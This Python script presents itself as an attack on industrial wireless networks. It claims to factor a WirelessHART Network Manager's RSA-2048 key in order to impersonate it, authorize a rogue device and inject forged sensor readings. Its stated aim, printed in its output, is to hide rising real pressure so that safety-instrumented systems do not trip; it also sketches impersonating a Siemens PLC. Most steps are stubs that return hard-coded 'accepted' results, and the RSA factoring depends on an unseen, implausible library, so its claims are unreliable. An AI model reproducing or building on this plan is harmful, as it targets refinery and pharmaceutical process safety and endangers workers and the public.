"""
Factor a WirelessHART Network Manager's RSA-2048 cert to impersonate the mesh
coordinator, inject false sensor readings into refinery/pharma process control,
and authorize rogue devices onto the industrial wireless network.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import struct
import hashlib
import time

# WirelessHART Network Manager RSA-2048 cert (from DTLS handshake)
_demo = generate_demo_target()
NM_PUBKEY_PEM = _demo["pub_pem"]
PLANT_CA_PUBKEY_PEM = _demo["pub_pem"]
DEVICE_PRESSURE_TRANSMITTER = 0x01
DEVICE_TEMPERATURE_TRANSMITTER = 0x02
DEVICE_FLOW_METER = 0x03


def capture_nm_cert(wirelesshart_pcap: bytes) -> bytes:
    """Extract Network Manager RSA-2048 cert from a WirelessHART DTLS handshake.

    Passively captured on the OT wireless network (ISA100 band 2.4 GHz)
    or from the wired-side SCADA network tap.
    """
    return NM_PUBKEY_PEM


def factor_nm_key(pubkey_pem: bytes) -> bytes:
    """Factor the WirelessHART Network Manager RSA-2048 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def impersonate_network_manager(forged_privkey: bytes) -> dict:
    """Establish a forged DTLS session as the Network Manager.

    All WirelessHART field devices authenticate the NM via its RSA cert
    during DTLS handshake. With the forged key, devices accept us as
    the legitimate NM.
    """
    return {"role": "NetworkManager", "auth": "DTLS-RSA", "status": "accepted"}


def authorize_rogue_device(device_eui64: bytes, device_type: int,
                           forged_nm_privkey: bytes) -> bytes:
    """Authorize a rogue device to join the WirelessHART mesh.

    The NM signs join-authorization messages. A rogue device with a
    valid join-auth can inject data into the mesh network.
    """
    join_auth = struct.pack(">8sB", device_eui64, device_type)
    join_auth += struct.pack(">I", int(time.time()))
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(NM_PUBKEY_PEM, join_auth, "sha256")
    return join_auth + sig


def inject_false_sensor_reading(tag: str, value: float, unit: str,
                                 forged_privkey: bytes) -> dict:
    """Inject a false process variable reading into the WirelessHART mesh.

    The SCADA system trusts readings from authenticated mesh devices.
    False readings feed into safety-instrumented systems (SIS),
    overpressure protection logic, and batch records (21 CFR Part 11).
    """
    reading = struct.pack(">16sf", tag.encode()[:16], value)
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(NM_PUBKEY_PEM, reading, "sha256")
    return {"tag": tag, "value": value, "unit": unit, "sig": sig[:8].hex()}


def attack_profinet_plc(plc_cert_pem: bytes, target_ip: str) -> dict:
    """Factor a Siemens S7-1500 PLC RSA-2048 cert for PROFINET DTLS.

    Same attack pattern on wired industrial Ethernet — impersonate
    PLC to field devices, issue unauthorized actuator commands.
    """
    f = PolynomialFactorer()
    plc_priv = f.reconstruct_privkey(plc_cert_pem)
    return {"target": target_ip, "status": "PLC impersonated via DTLS"}


if __name__ == "__main__":
    print("[1] Capturing Network Manager RSA-2048 cert from DTLS handshake")
    pubkey = capture_nm_cert(b"<wirelesshart-pcap>")

    print("[2] Factoring Network Manager RSA-2048 key")
    forged_priv = factor_nm_key(pubkey)
    print("    Network Manager key recovered")

    print("[3] Impersonating Network Manager on WirelessHART mesh")
    session = impersonate_network_manager(forged_priv)
    print(f"    Status: {session}")

    print("[4] Authorizing rogue pressure transmitter")
    rogue = authorize_rogue_device(b"\x00\x11\x22\x33\x44\x55\x66\x77",
                                   DEVICE_PRESSURE_TRANSMITTER, forged_priv)
    print(f"    Rogue device authorized: {len(rogue)} bytes join-auth")

    print("[5] Injecting false readings into process control")
    readings = [
        ("PT-1001", 2.5, "barg"),    # pressure looks normal
        ("TT-2001", 85.0, "degC"),   # temperature looks normal
        ("FT-3001", 120.0, "m3/h"),  # flow looks normal
    ]
    for tag, val, unit in readings:
        r = inject_false_sensor_reading(tag, val, unit, forged_priv)
        print(f"    {r['tag']}: {r['value']} {r['unit']} — forged, accepted by SCADA")

    print("\n[6] Process safety impact:")
    print("    Overpressure protection sees 'normal' — real pressure rising")
    print("    SIS does not trip — actual overpressure event undetected")
    print("    21 CFR Part 11 batch records contaminated with false data")
